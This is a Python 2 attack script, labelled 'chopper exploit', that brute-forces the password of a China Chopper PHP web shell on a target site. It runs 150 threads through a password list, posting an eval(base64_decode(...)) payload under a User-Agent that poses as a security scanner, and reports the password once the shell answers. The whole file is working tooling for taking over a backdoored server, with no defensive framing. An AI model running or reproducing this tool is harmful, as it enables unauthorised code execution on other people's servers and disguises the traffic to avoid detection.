#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib2
import threading
from   Queue     import  Queue
from   os        import  _exit, getenv
from   sys       import  argv, stdout
from   time      import  sleep

print '''
	+-----------------------------------------------------+
	+                                                     +
	+               chopper exploit                       +
	+                      hello, grey hat                +
	+                                                     +
	+-----------------------------------------------------+
      '''
      
queue = Queue()

class chopper( threading.Thread ):
	def __init__( self, target ):
		threading.Thread.__init__( self )
		self.target = target
	def run( self ):
		while 1:
			if queue.empty()== True:
				break
			self.get_pass()
	def get_pass( self ):
		self.password = str( queue.get() )
		flag = 1
		while flag:
			try:
				sleep( 3 )
				opener = urllib2.urlopen( urllib2.Request( self.target, headers={ "User-Agent" : "Mozilla/5.0, they call me 360 web scanner" } ), data="%s=@eval( base64_decode($_POST[cj] ));&cj=ZWNobygiZ3JleSIpO2RpZSgpOw=="%self.password ,timeout=7 )
				self.data = opener.read()
				opener.close()
				flag = 0
				if "grey" in self.data:
					print "\n\n[+] Found password -> "+self.password+"\n" if getenv( 'os' ).lower().startswith( 'win' ) else "\n\n[+] \033[1;2mFound password\033[0;92m -> \033[0m"+self.password+"\n"
					_exit( 1 )
					break
			except:
				pass


class Loading( threading.Thread ):
	def __init__( self, payload_num ):
		self.payload_num = payload_num
		threading.Thread.__init__( self )      
	def run( self ):
		keep_size = 1
		while keep_size:
			keep_size = queue.qsize()
			self.percent = 100 * ( self.payload_num - keep_size + .0 ) / self.payload_num
			stdout.write( 'Completed :       ' + '%.2f'%self.percent + '%\r' )
			stdout.flush()
			sleep( 1 )
		print '\n[-] payload over'


def work( target, password_file ):
	print 'Targer :         ',target; print 'Password-File :  ', password_file
	threads_num = 150; print 'Default threads :', threads_num

	with open( password_file ) as pf:
		for i in pf:
			queue.put( i.strip() )

	view_loading = Loading( queue.qsize() )
	view_loading.start()

	threads = [chopper( target ) for i in xrange( threads_num )]
	if [(j.setDaemon( True ), j.start()) for j in threads] == [i.join() for i in threads]:
		print 'all wars are civil wars,because all men are brothers.'

if __name__ == "__main__":
	work( argv[1], argv[2] )
